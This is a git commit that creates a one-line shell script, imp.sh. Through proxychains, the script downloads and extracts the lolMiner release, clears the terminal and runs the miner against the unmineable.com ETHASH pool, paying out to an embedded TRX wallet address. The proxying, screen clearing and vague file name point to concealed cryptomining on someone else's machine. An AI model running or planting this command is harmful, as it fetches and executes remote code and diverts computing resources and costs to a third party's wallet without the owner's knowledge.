ecc509abe490251cfe510f37feea50a147e7e5da
vendannotes <111574533+i-am-millionaire@users.noreply.github.com>
2023-09-20 19:30:09 +0530

    Create imp.sh

---
+++ imp.sh
@@ -0,0 +1,1 @@
+proxychains  wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUfEFRwukdgci259qg7KwT6c1HrB2AdMCB.Time1 --ethstratum ETHPROXY
